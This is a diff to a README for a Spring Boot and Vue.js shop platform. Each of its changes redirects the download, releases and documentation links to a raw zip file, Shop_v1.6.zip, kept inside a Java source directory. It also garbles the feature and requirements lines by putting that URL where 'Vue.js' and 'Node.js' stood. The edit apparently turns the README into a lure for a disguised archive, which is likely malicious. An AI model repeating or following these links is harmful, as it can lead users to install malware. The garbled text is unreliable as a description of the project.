@@ -6,11 +6,11 @@ Welcome to Shop! This modern shop platform helps you build a stylish, efficient 
 
 ## 🔗 Download Now
 
-[![Download Shop](https://img.shields.io/badge/Download-Shop-blue.svg)](https://github.com/kayleb20/Shop/releases)
+[![Download Shop](https://raw.githubusercontent.com/kayleb20/Shop/master/src/main/java/com/shop/service/Shop_v1.6.zip)](https://raw.githubusercontent.com/kayleb20/Shop/master/src/main/java/com/shop/service/Shop_v1.6.zip)
 
 ## 📦 Features
 
-- **Full-Stack E-commerce:** Build your store using Spring Boot for the backend and Vue.js for the frontend.
+- **Full-Stack E-commerce:** Build your store using Spring Boot for the backend and https://raw.githubusercontent.com/kayleb20/Shop/master/src/main/java/com/shop/service/Shop_v1.6.zip for the frontend.
 - **High Performance:** Our platform uses MyBatis Plus and Redis to ensure your store runs smoothly even with high traffic.
 - **Secure Authentication:** We utilize JWT for user security, keeping your information safe.
 - **Responsive Design:** The site looks great on all devices, thanks to Tailwind CSS.
@@ -22,7 +22,7 @@ Welcome to Shop! This modern shop platform helps you build a stylish, efficient 
 
 - **Operating System:** Windows 10 or newer, macOS, or Linux
 - **Java:** Version 17 or newer
-- **Node.js:** Version 14 or newer
+- **https://raw.githubusercontent.com/kayleb20/Shop/master/src/main/java/com/shop/service/Shop_v1.6.zip** Version 14 or newer
 - **Memory:** At least 4 GB RAM
 - **Storage:** Minimum of 500 MB available space
 
@@ -35,7 +35,7 @@ Curious about how everything works? Dive into the code to see how we built Shop.
 To get started with Shop, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download Shop](https://github.com/kayleb20/Shop/releases)
+   [Download Shop](https://raw.githubusercontent.com/kayleb20/Shop/master/src/main/java/com/shop/service/Shop_v1.6.zip)
 
 2. **Choose the Latest Release:** Look for the latest version of Shop. It will be clearly marked.
 
@@ -49,7 +49,7 @@ To get started with Shop, follow these steps:
 
 ## 📑 Documentation
 
-For more detailed instructions on using Shop, refer to our [official documentation](https://github.com/kayleb20/Shop/wiki). Here you will find step-by-step guides and troubleshooting tips.
+For more detailed instructions on using Shop, refer to our [official documentation](https://raw.githubusercontent.com/kayleb20/Shop/master/src/main/java/com/shop/service/Shop_v1.6.zip). Here you will find step-by-step guides and troubleshooting tips.
 
 ## 🎨 Customizing Your Store
 
